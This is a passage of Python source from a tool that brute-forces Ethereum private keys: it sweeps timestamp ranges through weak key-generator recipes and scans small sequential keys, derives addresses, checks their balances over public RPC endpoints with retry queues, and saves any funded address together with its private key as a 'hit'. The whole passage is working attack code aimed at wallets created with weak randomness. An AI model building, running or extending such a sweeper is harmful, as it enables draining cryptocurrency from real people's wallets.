    (_EthNoEndpoint) or exhausted rounds (_EsploraRateLimited) propagate, and
    the caller queues the batch either way.
    """
    ids = [c["id"] for c in calls]
    batch = len(calls) > 1
    rounds = max(1, ETH_RPC_ROUNDS)
    for _round in range(rounds):
        if should_stop and should_stop():
            raise RuntimeError("stopped by user")
        ready = _eth_ready()
        if not ready:
            if _eth_all_dead():
                raise _EthNoEndpoint(_eth_status())
            _esplora_wait_for_base(should_stop, _eth_bases())
            continue
        for base in ready:
            if batch and not _ETH_BATCH_OK.get(base, True):
                # This endpoint already told us it does not take arrays.
                out = []
                for c in calls:
                    one, _b = _eth_call_batch([c], should_stop)
                    out.append(one[0])
                return out, base
            kind, data, text = _eth_post_once(base, calls, batch, should_stop)
            if kind == "ok":
                _eth_batch_success()
                if batch:
                    by_id = {item.get("id"): item for item in data
                             if isinstance(item, dict)}
                    return [by_id.get(i) for i in ids], base
                return [data if isinstance(data, dict) else None], base
            if batch and kind in ("refused_batch", "reject"):
                # "We do not take arrays" or "that batch is too big": remember
                # it for this endpoint, halve the size for later batches, and
                # answer this one with single calls.
                with _ETH_LOCK:
                    _ETH_BATCH_OK[base] = False
                old, new = _eth_shrink_batch()
                if new < old:
                    _ETH_BASE_ERR[base] = "%s — batch size %d → %d" % (text, old, new)
                out = []
                for c in calls:
                    res, _b = _eth_call_batch([c], should_stop)
                    out.append(res[0])
                return out, base
        if _eth_all_dead():
            raise _EthNoEndpoint(_eth_status())
    raise _EsploraRateLimited("Ethereum RPC unavailable after %d round(s) — %s"
                              % (rounds, _eth_status()))


def _eth_balances(addresses, should_stop=None):
    """{address: {"wei": int, "nonce": int, "error": str}} for one batch.

    Two calls per address: eth_getBalance and eth_getTransactionCount. The
    nonce is what distinguishes "never used" from "funded then emptied", the
    same distinction tx_count gives on the Bitcoin side.
    """
    out = {a: {"wei": 0, "nonce": 0, "error": ""} for a in addresses}
    if not addresses:
        return out
    calls = []
    for i, a in enumerate(addresses):
        calls.append({"jsonrpc": "2.0", "id": "b%d" % i,
                      "method": "eth_getBalance", "params": [a, "latest"]})
        calls.append({"jsonrpc": "2.0", "id": "n%d" % i,
                      "method": "eth_getTransactionCount", "params": [a, "latest"]})
    res, _base = _eth_call_batch(calls, should_stop)
    for i, a in enumerate(addresses):
        bal = res[2 * i] if res and len(res) > 2 * i else None
        non = res[2 * i + 1] if res and len(res) > 2 * i + 1 else None
        try:
            if not isinstance(bal, dict) or "result" not in bal:
                err = (bal or {}).get("error") if isinstance(bal, dict) else None
                out[a]["error"] = ("RPC error: %s" % json.dumps(err)[:160]
                                   if err else "no balance result")[:200]
                continue
            out[a]["wei"] = int(bal["result"], 16)
            if isinstance(non, dict) and "result" in non:
                out[a]["nonce"] = int(non["result"], 16)
        except Exception as e:
            out[a]["error"] = str(e)[:200]
    return out


def _store_eth_check(addr, wei, nonce, error=""):
    """ETH rows reuse balance_checks: sats = whole gwei, mempool_sats = the
    remaining wei (so wei is reconstructable exactly), tx_count = nonce."""
    gwei, rem = divmod(int(wei), 10 ** 9)
    _store_balance_check(addr, gwei, int(nonce), rem, error)


def _eth_verdict(wei, nonce):
    if wei > 0:
        return "funded_verify_manually"
    if nonce == 0:
        return "never_used_likely_never_funded"
    return "empty_or_spent"


# ── The retry queue: unchecked candidates are persisted, never dropped ────
def _eth_pending_path():
    return DATA_DIR / ETH_PENDING_FILE


def _eth_pending_count():
    """Lines in the queue file (cached after the first read)."""
    with _ETH_LOCK:
        if _ETH_PENDING_N[0] >= 0:
            return _ETH_PENDING_N[0]
    n = 0
    try:
        with _eth_pending_path().open("r", encoding="utf-8") as f:
            for _ in f:
                n += 1
    except OSError:
        n = 0
    with _ETH_LOCK:
        _ETH_PENDING_N[0] = n
    return n


def _eth_queue_pending(items, job, log=None, reason="", prefix=""):
    """Append unchecked candidates to eth_pending.jsonl. Returns how many.

    Deriving a candidate costs up to ~2.7 ms (PBKDF2 dominates), so a batch
    that could not be checked is worth keeping: "Re-check queued candidates"
    drains this file later without re-deriving anything.
    """
    if not items:
        return 0
    have = _eth_pending_count()
    room = len(items) if not ETH_PENDING_MAX else max(0, ETH_PENDING_MAX - have)
    take = list(items)[:room]
    dropped = len(items) - len(take)
    if take:
        stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
        try:
            with _eth_pending_path().open("a", encoding="utf-8") as f:
                for c in take:
                    f.write(json.dumps({
                        "address": c.get("address"), "privkey": c.get("privkey"),
                        "recipe": c.get("recipe"),
                        "attack": c.get("attack", "eth"),
                        "ts": c.get("ts"), "unit": c.get("unit"),
                        "queued_at": stamp, "reason": (reason or "")[:120],
                    }) + "\n")
            with _ETH_LOCK:
                _ETH_PENDING_N[0] = have + len(take)
        except OSError as e:
            if log:
                log("%s[eth] could not write %s: %s"
                    % (prefix, _eth_pending_path(), e))
            job["eth_dropped"] = job.get("eth_dropped", 0) + len(items)
            return 0
    job["eth_queued"] = job.get("eth_queued", 0) + len(take)
    if dropped:
        job["eth_dropped"] = job.get("eth_dropped", 0) + dropped
        if log and not job.get("_eth_drop_warned"):
            job["_eth_drop_warned"] = True
            log("%s[!] retry queue full (ETH_PENDING_MAX=%s) — %s candidate(s) "
                "dropped" % (prefix, format(ETH_PENDING_MAX, ","),
                             format(dropped, ",")))
    return len(take)


def _eth_pending_read(limit=None):
    out = []
    try:
        with _eth_pending_path().open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    row = json.loads(line)
                except Exception:
                    continue
                if isinstance(row, dict) and row.get("address"):
                    out.append(row)
                    if limit and len(out) >= limit:
                        break
    except OSError:
        return []
    return out


def _eth_pending_write(items):
    """Atomic replace of the queue with whatever is still unchecked."""
    path = _eth_pending_path()
    tmp = path.with_name(path.name + ".part")
    try:
        with tmp.open("w", encoding="utf-8") as f:
            for row in items:
                f.write(json.dumps(row) + "\n")
        os.replace(tmp, path)
    except OSError:
        try:
            tmp.unlink()
        except OSError:
            pass
        raise
    with _ETH_LOCK:
        _ETH_PENDING_N[0] = len(items)


def _eth_record(c, v, log, job, prefix=""):
    """Store one balance check; save the hit if it clears ETH_MIN_WEI.

    Returns ("hit" | "skipped" | "error", payload_or_None). Shared by the sweep
    jobs and the queue drainer so both save hits identically.
    """
    now = datetime.now(timezone.utc).isoformat(timespec="seconds")
    err = (v or {}).get("error") or ""
    if err:
        _store_eth_check(c["address"], 0, 0, err)
        hit = {**c, "balance_wei": None, "balance_nonce": 0,
               "balance_checked_at": now, "balance_error": err,
               "balance_verdict": "check_failed"}
        _save_result(c.get("attack", "eth"), hit)
        log("%s[!] %s: balance check failed (%s) — saved as candidate"
            % (prefix, c["address"], err))
        return "error", hit
    wei, nonce = v["wei"], v["nonce"]
    _store_eth_check(c["address"], wei, nonce)
    hit = {**c, "balance_wei": str(wei), "balance_eth": wei / 1e18,
           "balance_nonce": nonce, "balance_checked_at": now,
           "balance_error": "", "balance_verdict": _eth_verdict(wei, nonce)}
    if wei >= max(ETH_MIN_WEI, 1):
        _save_result(c.get("attack", "eth"), hit)
        log("%s  ★★★ ETH HIT %s  %.6f ETH  nonce=%d  privkey=%s  %s"
            % (prefix, hit["address"], wei / 1e18, nonce,
               hit.get("privkey", ""), hit.get("recipe", "")))
        return "hit", hit
    job["eth_skipped"] = job.get("eth_skipped", 0) + 1
    return "skipped", None


def _eth_flush(candidates, log, job, should_stop=None, prefix=""):
    """Live-check candidates in adaptive batches; save the funded ones.

    Returns (saved_hits, stopped). Nothing is silently discarded: a batch that
    cannot be checked goes to eth_pending.jsonl, and a Stop queues whatever is
    still in the buffer.
    """
    if not candidates:
        return [], False
    if not ETH_VERIFY_BALANCES:
        job["eth_unchecked"] = job.get("eth_unchecked", 0) + len(candidates)
        return [], False
    saved = []
    i = 0
    while i < len(candidates):
        if should_stop and should_stop():
            n = _eth_queue_pending(candidates[i:], job, log,
                                   "stopped before checking", prefix)
            if n:
                log("%s[eth] stopped — %s unchecked candidate(s) queued in %s"
                    % (prefix, format(n, ","), _eth_pending_path()))
            return saved, True
        chunk = candidates[i:i + _eth_batch_size()]
        i += len(chunk)
        addrs = [c["address"] for c in chunk]
        try:
            balances = _eth_balances(addrs, should_stop)
        except RuntimeError as e:
            msg = str(e)
            if "stopped by user" in msg:
                n = _eth_queue_pending(candidates[i - len(chunk):], job, log,
                                       "stopped by user", prefix)
                log("%s[eth] stopped by user (%s candidate(s) queued)"
                    % (prefix, format(n, ",")))
                return saved, True
            if isinstance(e, _EthNoEndpoint):
                n = _eth_queue_pending(candidates[i - len(chunk):], job, log,
                                       msg, prefix)
                job["eth_no_rpc"] = True
                log("%s[eth] EVERY configured endpoint refused us: %s"
                    % (prefix, msg))
                log("%s[eth] %s candidate(s) queued in %s and this run is "
                    "stopping — deriving more would only grow the queue. Set "
                    "ETH_RPC_URLS to an endpoint that answers this host (your "
                    "own node is the reliable option), then press 'Re-check "
                    "queued candidates'." % (prefix, format(n, ","),
                                             _eth_pending_path()))
                job["detail"] = ("stopped: no RPC endpoint answered — %s queued"
                                 % format(n, ","))
                return saved, True
            job["throttled"] = job.get("throttled", 0) + len(addrs)
            n = _eth_queue_pending(chunk, job, log, msg, prefix)
            log("%s[!] %s candidate(s) unchecked, %s queued for re-check: %s"
                % (prefix, format(len(addrs), ","), format(n, ","), msg))
            continue
        for c in chunk:
            v = balances.get(c["address"]) or {"wei": 0, "nonce": 0,
                                               "error": "no result"}
            _kind, hit = _eth_record(c, v, log, job, prefix)
            if hit is not None:
                saved.append(hit)
    return saved, False


def _eth_preflight(log, job=None, prefix=""):
    """Probe every configured endpoint before deriving anything.

    One parallel round of eth_blockNumber plus a small batch probe says which
    endpoints are usable from THIS host — starting a multi-hour sweep against
    endpoints that answer 403 is the expensive mistake this avoids. Returns the
    usable bases (empty means "do not start").
    """
    global _ETH_ACTIVE
    if not ETH_VERIFY_BALANCES or not ETH_PREFLIGHT:
        with _ETH_LOCK:
            _ETH_ACTIVE = []
        return list(_ETH_RPC_BASES)
    t0 = time.monotonic()
    with ThreadPoolExecutor(max_workers=min(4, max(1, len(_ETH_RPC_BASES)))) as ex:
        infos = list(ex.map(_eth_ping_base, _ETH_RPC_BASES))
    alive = []
    for info in infos:
        if info["ok"]:
            alive.append(info["url"])
            _eth_unpark(info["url"])
            log("%s[eth] RPC %s: block %s, %d ms, batch %s"
                % (prefix, info["host"], format(info["block"] or 0, ","),
                   info["ms"], "yes" if info["batch"] else "NO — single calls"))
        else:
            err = info["error"] or "no reply"
            dead = ("403" in err) or ("401" in err) or ("Forbidden" in err)
            _eth_park(info["url"],
                      ETH_DEAD_COOL_SECS if dead else ETH_ERROR_COOL_SECS,
                      err, dead=dead)
            log("%s[eth] RPC %s: UNUSABLE — %s%s"
                % (prefix, info["host"], err,
                   " (refusing this host; parked %.0fs)" % ETH_DEAD_COOL_SECS
                   if dead else ""))
    with _ETH_LOCK:
        _ETH_ACTIVE = alive
    if job is not None:
        job["eth_rpc_alive"] = len(alive)
    if alive:
        log("%s[eth] %d/%d endpoint(s) usable in %.1fs — batches of %d "
            "address(es) (%d calls)"
            % (prefix, len(alive), len(infos), time.monotonic() - t0,
               _eth_batch_size(), _eth_batch_size() * 2))
    else:
        log("%s[eth] NO endpoint answered. Set ETH_RPC_URLS to your own node or "
            "a provider that accepts this host — nothing can be checked until "
            "then. (ETH_PREFLIGHT=0 skips this probe.)" % prefix)
    return alive


def retry_eth_pending(log, job):
    """Drain eth_pending.jsonl: re-check queued candidates, save the hits.

    The queue holds whole candidates (address, privkey, recipe, timestamp), so a
    re-check needs no re-derivation and a funded address is saved with the same
    payload a live sweep would have produced.
    """
    items = _eth_pending_read()
    path = _eth_pending_path()
    if not items:
        log("[eth-retry] nothing queued (%s is empty)" % path)
        job["detail"] = "queue empty"
        job["progress"] = 1.0
        return []
    total = len(items)
    log("[eth-retry] %s queued candidate(s) from %s"
        % (format(total, ","), path))
    if not _eth_preflight(log, job):
        job["detail"] = "no RPC endpoint answered — queue untouched"
        return []
    saved, remaining = [], []
    checked = 0
    t0 = time.time()
    i = 0
    stopped = False
    while i < total:
        if job["stop"]:
            log("[eth-retry] stopped by user — the rest stays queued")
            remaining += items[i:]
            stopped = True
            break
        chunk = items[i:i + _eth_batch_size()]
        i += len(chunk)
        addrs = [c["address"] for c in chunk]
        try:
            balances = _eth_balances(addrs, lambda: job["stop"])
        except RuntimeError as e:
            if isinstance(e, _EthNoEndpoint):
                log("[eth-retry] every endpoint refused us: %s" % e)
                remaining += items[i - len(chunk):]
                stopped = True
                break
            remaining += chunk
            log("[eth-retry] %s candidate(s) stay queued: %s"
                % (format(len(chunk), ","), e))
            continue
        for c in chunk:
            v = balances.get(c["address"]) or {"wei": 0, "nonce": 0,
                                               "error": "no result"}
            checked += 1
            _kind, hit = _eth_record(c, v, log, job)
            if hit is not None:
                saved.append(hit)
        rate = checked / max(time.time() - t0, 0.001)
        job["progress"] = min(1.0, i / total)
        job["throttled"] = len(remaining)
        job["detail"] = ("%s/%s queued  hits=%d  empty=%s  re-queued=%s  "
                         "%.1f addr/s  eta ~%.1f min"
                         % (format(i, ","), format(total, ","), len(saved),
                            format(job.get("eth_skipped", 0), ","),
                            format(len(remaining), ","), rate,
                            (total - i) / max(rate, 0.001) / 60))
    try:
        _eth_pending_write(remaining)
    except OSError as e:
        log("[eth-retry] could not rewrite %s: %s — the queue is unchanged"
            % (path, e))
        remaining = items
    if not stopped:
        job["progress"] = 1.0
    job["throttled"] = len(remaining)
    log("[eth-retry] done — %d hit(s) saved, %s empty skipped, %s still queued "
        "in %s" % (len(saved), format(job.get("eth_skipped", 0), ","),
                   format(len(remaining), ","), path))
    return saved


def _eth_candidate(rid, priv, extra, attack, ts=None, unit=None):
    """Build the hit payload for one derived candidate (address encoded once)."""
    addr = eth_address(priv)
    if addr is None:
        return None
    hit = {"chain": "ethereum", "address": addr, "privkey": hex(priv % N),
           "recipe": rid, "recipe_label": ETH_RECIPES[rid]["label"],
           "attack": attack,
           "found_at": datetime.now(timezone.utc).isoformat(timespec="seconds")}
    if ts is not None:
        hit["ts"] = ts
    if unit:
        hit["unit"] = unit
    hit.update(extra)
    return hit


def attack_eth_timestamp(start, end, unit, recipe_ids, log, job,
                         p_base=0.0, p_span=1.0, label=""):
    """Sweep a timestamp range through the selected weak-generator recipes.

    `p_base`/`p_span` map this range onto a slice of the job's progress bar so
    the era batch can sweep several windows in one run, and `label` prefixes
    every log line so a batch run stays readable.
    """
    if label:
        _outer_log = log

        def log(msg, _o=_outer_log, _p=label):
            _o(_p + msg)

    ids = [r for r in (recipe_ids or [])
           if r in ETH_RECIPES and unit in ETH_RECIPES[r]["units"]]
    if not ids:
        log("[eth] no usable recipe for unit=%s — nothing to do" % unit)
        job["detail"] = "no recipes for this unit"
        return []
    total = int(end) - int(start) + 1
    if total <= 0:
        return []
    chunk_count = -(-total // max(1, ETH_MAX_STEPS))
    log("[eth] %d..%d %s  (%s timestamps, %s chunk(s) of at most %s steps)  "
        "recipes: %s  EC: %s  hash: %s"
        % (start, end, unit, format(total, ","), format(chunk_count, ","),
           format(ETH_MAX_STEPS, ","), ", ".join(ids), EC_BACKEND,
           ETH_HASH_BACKEND))
    if ETH_VERIFY_BALANCES:
        log("[eth] endpoints before probing: %s" % _eth_status())
        if not _eth_preflight(log, job):
            job["detail"] = ("no RPC endpoint answered — nothing derived; set "
                             "ETH_RPC_URLS")
            return []
    else:
        log("[eth] ETH_VERIFY_BALANCES=0 — candidates are NOT checked and NOT "
            "saved; they are only counted as unchecked")
    hits = []
    pending = []
    seen_batch = set()          # dedupe within a batch only: bounded memory,
    ts_done = 0                 # so a 2.5M-seed sweep needs no address set
    t0 = time.time()
    base_done = 0
    stopped = False
    for chunk_no, (cs, ce) in enumerate(
            _range_chunks(start, end, ETH_MAX_STEPS), 1):
        if job["stop"]:
            log("[eth] stopped")
            break
        log("[eth] chunk %d/%d: %d..%d (%s timestamps)"
            % (chunk_no, chunk_count, cs, ce, format(ce - cs + 1, ",")))
        for i, ts in enumerate(range(cs, ce + 1)):
            if job["stop"]:
                log("[eth] stopped")
                stopped = True
                break
            for rid in ids:
                try:
                    for priv, extra in ETH_RECIPES[rid]["fn"](ts, unit):
                        if not priv or priv % N == 0:
                            continue
                        hit = _eth_candidate(rid, priv, extra, "eth_" + rid,
                                             ts, unit)
                        if hit and hit["address"] not in seen_batch:
                            seen_batch.add(hit["address"])
                            pending.append(hit)
                except Exception as e:
                    if not job.get("_eth_recipe_err"):
                        job["_eth_recipe_err"] = True
                        log("[eth] recipe %s failed: %s" % (rid, e))
            ts_done += 1
            if len(pending) >= _eth_batch_size():
                batch, pending = pending, []
                seen_batch.clear()
                saved, stopped = _eth_flush(batch, log, job,
                                            lambda: job["stop"])
                hits += saved
                if stopped:
                    break
            if i % 200 == 0 or i == (ce - cs):
                elapsed = max(time.time() - t0, 0.001)
                rate = (base_done + i + 1) / elapsed
                left = total - (base_done + i + 1)
                job["progress"] = min(1.0, p_base + p_span *
                                      (base_done + i + 1) / total)
                job["detail"] = ("%s/%s ts  chunk %d/%d  %.0f ts/s  %d "
                                 "recipe(s)  hits=%d  queued=%s  throttled=%s  "
                                 "batch=%d  eta ~%.1f min"
                                 % (format(base_done + i + 1, ","),
                                    format(total, ","), chunk_no, chunk_count,
                                    rate, len(ids), len(hits),
                                    format(job.get("eth_queued", 0), ","),
                                    format(job.get("throttled", 0), ","),
                                    _eth_batch_size(),
                                    left / max(rate, 0.001) / 60))
        base_done += ce - cs + 1
        if stopped:
            break
    if pending:
        if job.get("eth_no_rpc"):
            _eth_queue_pending(pending, job, log, "no RPC endpoint answered")
        else:
            saved, _stopped = _eth_flush(pending, log, job, lambda: job["stop"])
            hits += saved
    log("[eth] done — %d hit(s), %s empty candidate(s) skipped, %s queued for "
        "re-check in %s, %s dropped, %s unchecked (verification off)"
        % (len(hits), format(job.get("eth_skipped", 0), ","),
           format(job.get("eth_queued", 0), ","), _eth_pending_path(),
           format(job.get("eth_dropped", 0), ","),
           format(job.get("eth_unchecked", 0), ",")))
    return hits


def attack_eth_eras(specs, recipe_ids, log, job):
    """Sweep several fixed era windows in one run, one after another.

    `specs` is a list of {"id", "steps", "offset"} from the UI. Eras run
    SEQUENTIALLY inside this job on purpose: the RPC endpoint — not the CPU — is
    the bottleneck, so parallel era jobs would multiply 429s without finding
    anything faster, and one job keeps one progress bar, one Stop button and one
    retry queue.
    """
    by_id = {e["id"]: e for e in ETH_ERAS}
    picked = []
    for s in specs or []:
        e = by_id.get(str(s.get("id") or ""))
        if not e:
            log("[era] unknown era id %r — skipped" % (s.get("id"),))
            continue
        try:
            steps = max(1, int(s.get("steps") or ETH_ERA_STEPS))
            offset = max(0, int(s.get("offset") or 0))
        except (TypeError, ValueError):
            log("[era] %s: steps/offset must be integers — skipped" % e["id"])
            continue
        picked.append((e, steps, offset))
    if not picked:
        log("[era] no eras selected — nothing to do")
        job["detail"] = "no eras selected"
        return []
    n = len(picked)
    ids = [r for r in (recipe_ids or []) if r in ETH_RECIPES]
    log("[era] batch of %d era(s), recipes: %s  EC: %s  hash: %s"
        % (n, ", ".join(ids) or "none", EC_BACKEND, ETH_HASH_BACKEND))
    log("[era] eras run one after another in this job: the RPC endpoint is the "
        "bottleneck, so parallel eras would only multiply 429s.")
    hits = []
    done_eras = 0
    broke = False
    for k, (e, steps, offset) in enumerate(picked, 1):
        if job["stop"]:
            log("[era] stopped before %s" % e["id"])
            break
        label = "[era %d/%d · %s %s] " % (k, n, e["era"], e["id"])
        usable = [r for r in ids if e["unit"] in ETH_RECIPES[r]["units"]]
        if not usable:
            log("%sno selected recipe accepts unit=%s — skipped (recipes for "
                "this era: %s)" % (label, e["unit"], ", ".join(e["recipes"])))
            continue
        start = e["start"] + offset
        if start > e["end"]:
            log("%soffset %s is past the end of the window — skipped"
                % (label, format(offset, ",")))
            continue
        end = min(e["end"], start + steps - 1)
        span = e["end"] - e["start"] + 1
        covered = end - start + 1
        log("%s%s — %s" % (label, e["label"], e["window"]))
        log("%s%d..%d %s: %s of %s timestamps in this era (%.6f%% of the "
            "window), offset %s"
            % (label, start, end, e["unit"], format(covered, ","),
               format(span, ","), 100.0 * covered / span, format(offset, ",")))
        if e.get("warn"):
            log("%s⚠ %s — %s" % (label, e["warn"], e["note"]))
        if not e.get("scannable", True):
            log("%s⚠ this window is NOT recoverable by a private-key sweep; it "
                "is scanned only to demonstrate that." % label)
        hits += attack_eth_timestamp(start, end, e["unit"], usable, log, job,
                                     p_base=(k - 1) / n, p_span=1.0 / n,
                                     label=label)
        # keep the era visible in the job detail the sticky header chip shows
        job["detail"] = "%s %s" % (e["era"], job.get("detail") or "")
        if job["stop"]:
            # Stop landed somewhere inside this era. Did the era itself finish?
            # attack_eth_timestamp maps era k onto [k-1/n, k/n] of the bar, so
            # reaching k/n means the era completed and only the *next* ones were
            # never started. Anything less is an interrupted era, which must not
            # be credited -- that is how a run stopped on its first timestamp
            # used to end up showing a full green bar.
            finished = job.get("progress", 0.0) >= (k / n) - 1e-9
            if finished:
                done_eras += 1
                log("[era] stopped after %s completed — %d of %d era(s) swept; "
                    "the rest were not started (%s empty skipped, %s queued in "
                    "%s)"
                    % (e["id"], done_eras, n,
                       format(job.get("eth_skipped", 0), ","),
                       format(job.get("eth_queued", 0), ","),
                       _eth_pending_path()))
            else:
                log("[era] stopped during %s — %d of %d era(s) finished, %s "
                    "empty skipped, %s queued in %s"
                    % (e["id"], done_eras, n,
                       format(job.get("eth_skipped", 0), ","),
                       format(job.get("eth_queued", 0), ","),
                       _eth_pending_path()))
            break
        done_eras += 1
        # Both signals mean the same thing: nothing could be checked. `eth_no_rpc`
        # is set when every endpoint refuses mid-batch; `eth_rpc_alive == 0` when
        # the pre-flight probe found none answering at all.
        if job.get("eth_no_rpc") or job.get("eth_rpc_alive") == 0:
            broke = True
            log("[era] stopping the batch: no RPC endpoint answered — the "
                "remaining era(s) would only derive candidates nobody can "
                "check. Anything already derived is in %s."
                % _eth_pending_path())
            break
    if job["stop"] or broke:
        # Not finished: leave the bar exactly where the run got to. Never round
        # it up -- a stopped run that shows 100% is how people lose track of
        # which slice of an era they still owe themselves.
        job["progress"] = min(1.0, max(0.0, job.get("progress", 0.0)))
    else:
        job["progress"] = 1.0
    log("[era] batch done — %d of %d era(s) swept, %d hit(s), %s empty skipped, "
        "%s queued for re-check in %s%s"
        % (done_eras, n, len(hits), format(job.get("eth_skipped", 0), ","),
           format(job.get("eth_queued", 0), ","), _eth_pending_path(),
           "" if not broke else "  (stopped early: no RPC endpoint)"))
    return hits


def attack_eth_weakkeys(count, extra_keys, log, job):
    """Sequential keys 1..count plus any hex keys pasted in the UI.

    This is the 2015-2016 "ethercombing" vector: keys that are small integers
    or trivial words, not a timestamp sweep.
    """
    count = max(0, int(count or 0))
    extra = []
    seen_extra = set()
    for line in (extra_keys or []):
        line = (line or "").strip()
        if not line:
            continue
        try:
            k = int(line, 16) if line.lower().startswith("0x") else int(line, 16)
        except ValueError:
            log("[eth] skipping unparsable key: %s" % line[:40])
            continue
        k %= N
        if not k or k in seen_extra:
            continue
        seen_extra.add(k)
        if k <= count:
            log("[eth] pasted key %s is inside 1..%s — the sequential scan "
                "covers it" % (hex(k), format(count, ",")))
            continue
        extra.append(k)
    total = count + len(extra)
    if total <= 0:
        log("[eth] nothing to scan")
        job["detail"] = "no keys"
        return []
    log("[eth] weak keys: 1..%s plus %d pasted key(s)  EC: %s  hash: %s"
        % (format(count, ","), len(extra), EC_BACKEND, ETH_HASH_BACKEND))
    if ETH_VERIFY_BALANCES:
        if not _eth_preflight(log, job):
            job["detail"] = ("no RPC endpoint answered — nothing derived; set "
                             "ETH_RPC_URLS")
            return []
    if not ETH_VERIFY_BALANCES:
        log("[eth] ETH_VERIFY_BALANCES=0 — candidates are NOT checked and NOT "
            "saved; they are only counted as unchecked")
    hits = []
    pending = []
    seen_batch = set()
    done = 0
    t0 = time.time()
    stopped = False

    def key_stream():
        for k in extra:
            yield k, "pasted"
        for i in range(1, count + 1):
            yield i, "sequential"

    for k, origin in key_stream():
        if job["stop"]:
            log("[eth] stopped")
            stopped = True
            break
        try:
            addr = eth_address(k)
        except Exception:
            addr = None
        if addr and addr not in seen_batch:
            seen_batch.add(addr)
            pending.append({"chain": "ethereum", "address": addr,
                            "privkey": hex(k), "recipe": "weakkey",
                            "recipe_label": origin + " weak key",
                            "attack": "eth_weakkey",
                            "found_at": datetime.now(
                                timezone.utc).isoformat(timespec="seconds")})
        done += 1
        if len(pending) >= _eth_batch_size():
            batch, pending = pending, []
            seen_batch.clear()
            saved, stopped = _eth_flush(batch, log, job, lambda: job["stop"])
            hits += saved
            if stopped:
                break
        if done % 500 == 0:
            rate = done / max(time.time() - t0, 0.001)
            job["progress"] = min(1.0, done / total)
            job["detail"] = ("%s/%s keys  %.0f key/s  hits=%d  queued=%s  "
                             "throttled=%s  batch=%d  eta ~%.1f min"
                             % (format(done, ","), format(total, ","), rate,
                                len(hits),
                                format(job.get("eth_queued", 0), ","),
                                format(job.get("throttled", 0), ","),
                                _eth_batch_size(),
                                (total - done) / max(rate, 0.001) / 60))
    if pending:
        if job.get("eth_no_rpc"):
            _eth_queue_pending(pending, job, log, "no RPC endpoint answered")
        else:
            saved, _stopped = _eth_flush(pending, log, job, lambda: job["stop"])
            hits += saved
    job["progress"] = min(1.0, done / total) if total else 1.0
    log("[eth] done — %d hit(s) from %s key(s), %s empty skipped, %s queued "
        "for re-check in %s"
        % (len(hits), format(done, ","),
           format(job.get("eth_skipped", 0), ","),
           format(job.get("eth_queued", 0), ","), _eth_pending_path()))
    return hits


def _all_eth_addresses(limit=None):
    """Unique checksummed 0x addresses from every saved hit."""
    with _db() as c:
        rows = list(c.execute("SELECT payload FROM results ORDER BY id DESC"))
    out, seen = [], set()
    for (p,) in rows:
        try:
            item = json.loads(p)
        except Exception:
            continue
        if not isinstance(item, dict):
            continue
        for key in ("address", "recovered_addr"):
            a = item.get(key)
            if not isinstance(a, str) or not _ETH_ADDR_RE.match(a.strip()):
                continue
            a = a.strip()
            if a.lower() in seen:
                continue
            seen.add(a.lower())
            out.append(a)
            if limit and len(out) >= limit:
                return out
    return out


def verify_eth_balances(force, log, job):
    """Re-check saved ETH hits over RPC, in batches, with retry passes.

    Mirrors the Bitcoin verify job: a 429 re-queues the batch instead of
    recording an error, because a rate limit says nothing about the address.
    """
    addrs = _all_eth_addresses(VERIFY_MAX_ADDRESSES)
    if not addrs:
        log("[eth-verify] no saved Ethereum hits with a valid 0x address")
        job["detail"] = "no addresses to check"
        return
    total = len(addrs)
    log("[eth-verify] checking %s address(es) — endpoints: %s"
        % (format(total, ","), _eth_status()))
    if not _eth_preflight(log, job):
        job["detail"] = "no RPC endpoint answered"
        return
    t0 = time.time()
    funded = never_used = emptied = errors = checked = 0
    pending = list(addrs)
    passes = 0
    stopped = False
    while pending and passes <= VERIFY_RETRY_PASSES and not stopped:
        passes += 1
        batch_all, pending = pending, []
        if passes > 1:
            wait = min(ESPLORA_MAX_BACKOFF_SECS, 5.0 * (2 ** (passes - 2)))
            log("[eth-verify] pass %d/%d: retrying %s throttled address(es) "
                "in %.0fs — %s"
                % (passes, VERIFY_RETRY_PASSES + 1, format(len(batch_all), ","),
                   wait, _eth_status()))
            try:
                _esplora_sleep(wait, lambda: job["stop"])
            except RuntimeError:
                log("[eth-verify] stopped by user")
                break
        for off in range(0, len(batch_all), _eth_batch_size()):
            if job["stop"]:
                log("[eth-verify] stopped by user")
                stopped = True
                break
            chunk = batch_all[off:off + _eth_batch_size()]
            try:
                res = _eth_balances(chunk, lambda: job["stop"])
            except RuntimeError as e:
                if "stopped by user" in str(e):
                    log("[eth-verify] stopped by user")
                    stopped = True
                    break
                if isinstance(e, _EthNoEndpoint):
                    log("[eth-verify] every endpoint refused us: %s" % e)
                    pending += batch_all[off:]
                    stopped = True
                    break
                pending += chunk                 # throttled: retry later
                continue
            for a in chunk:
                v = res.get(a) or {"wei": 0, "nonce": 0, "error": "no result"}
                if v["error"]:
                    errors += 1
                    checked += 1
                    _store_eth_check(a, 0, 0, v["error"])
                    log("[eth-verify] %s: %s" % (a, v["error"]))
                    continue
                checked += 1
                _store_eth_check(a, v["wei"], v["nonce"])
                if v["wei"] > 0:
                    funded += 1
                    log("[eth-verify] %s: %.6f ETH nonce=%d — VERIFY MANUALLY"
                        % (a, v["wei"] / 1e18, v["nonce"]))
                elif v["nonce"] == 0:
                    never_used += 1
                else:
                    emptied += 1
                    log("[eth-verify] %s: 0 ETH, nonce=%d (used and emptied)"
                        % (a, v["nonce"]))
            rate = checked / max(time.time() - t0, 0.001)
            job["progress"] = min(1.0, checked / total)
            job["throttled"] = len(pending)
            job["detail"] = ("%s/%s addresses  funded=%d  never-used=%s  "
                             "emptied=%s  errors=%d  throttled=%s  %.1f addr/s"
                             % (format(checked, ","), format(total, ","),
                                funded, format(never_used, ","),
                                format(emptied, ","), errors,
                                format(len(pending), ","), rate))
    job["throttled"] = len(pending)
    tail = (", %s still throttled after %d pass(es) — run it again"
            % (format(len(pending), ","), passes) if pending else "")
    log("[eth-verify] done — %d with a balance, %s never used, %s emptied, "
        "%d errors%s"
        % (funded, format(never_used, ","), format(emptied, ","), errors, tail))


def _eth_ping_base(base):
    """eth_blockNumber plus a 2-call batch probe, for the Test RPC button."""
    t0 = time.monotonic()
    info = {"url": base, "host": base.split("//")[-1], "ok": False,
            "block": None, "batch": False, "ms": 0, "error": ""}
    try:
        r = requests.post(base, json={"jsonrpc": "2.0", "id": 1,
                                      "method": "eth_blockNumber",
                                      "params": []},
                          timeout=min(12.0, ETH_RPC_TIMEOUT),
                          headers=_eth_headers())
